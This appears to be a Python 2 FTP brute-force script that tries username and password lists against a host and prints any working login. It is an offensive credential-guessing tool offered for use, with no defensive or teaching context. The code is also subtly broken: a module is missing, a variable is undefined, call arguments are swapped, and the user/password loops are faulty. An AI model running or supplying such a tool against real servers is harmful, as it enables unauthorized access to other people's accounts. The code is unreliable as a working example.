import ftplib
from threading import  *
import optparse

def connect(hostname, user, password):
	try:
		password = password.strip('\n')
		ftp = ftplib.FTP(hostname)
		ftp.login(user, password)
		print '[*] Found Password : %s/%s'%(user,password)
		Found = True
	except:
		pass


def main():
	parser = optparse.OptionParser('Usage: ftp_brute -u <username> -H host -P <passwordlist>')
	parser.add_option('-u', dest='User', type='string', help='---')
	parser.add_option('-P', dest='Passwords', type='string', help='---')
	parser.add_option('-H', dest='Host', type='string', help='---')
	parser.add_option('-U', dest='Users', type='string', help='---')

	(options, args) = parser.parse_args()
	
	User = options.User
	Users = options.Users
	Host = options.Host
	Passwords = options.Passwords

	if (User == None & Users == None) | (Host == None) | (Passwords == None):
		print parser.usage
		exit
	
	if not os.path.isfile(Passwords):
		print '[-] %s Does\'nt Exist.'%Passwords
		exit(0)
	
	Passwords = open(Passwords, 'r')
	if Users != None:
		if not os.path.isfile(Users):
			print '[-] %s Does\'nt Exist.'%Users
			exit(0)
		else:
			f = open(Users, 'r')
			for User in f.readlines():
				for Pass in Passwords.readlines():
					if verbose:
						print '[*] Trying %s:%s'%(User,Pass.strip('\n'))
					connect(User, Host, Pass.strip('\n'))
	else:
		for Pass in Passwords.readlines():
			if verbose:
				print '[*] Trying %s:%s'%(User, Pass.strip('\n'))


if __name__ == '__main__':
	main()
